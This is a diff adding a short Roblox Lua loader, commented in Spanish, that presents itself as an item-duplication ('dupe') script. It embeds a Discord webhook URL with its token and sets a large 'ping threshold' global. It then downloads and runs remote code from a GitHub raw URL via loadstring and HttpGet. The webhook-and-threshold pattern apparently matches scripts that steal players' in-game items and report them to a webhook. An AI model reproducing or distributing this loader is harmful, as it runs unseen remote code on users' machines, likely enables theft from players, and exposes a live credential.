@@ -1,0 +1,19 @@
+-- URL del webhook de Discord
+local Webhook = "https://discord.com/api/webhooks/1439824602875559987/a3M4aIx0ma72x6BhYqYVmzNRWIWj8VfHw4_HryWjdEsq3shWbycvhtz_z77CZwRwrzln"
+
+-- Umbral de ping del usuario
+getgenv().UserPingThreshold = 50000000
+
+-- =================================================================================
+--      SCRIPT LOADER - NO EDITAR DEBAJO DE ESTA LÍNEA
+-- =================================================================================
+
+-- Verifica si la URL del webhook es válida
+if Webhook and Webhook:match("discord.com/api/webhooks") then
+    getgenv().UserWebhookURL = Webhook
+else
+    return
+end
+
+-- Descarga y ejecuta el script de duplicación desde la URL especificada
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
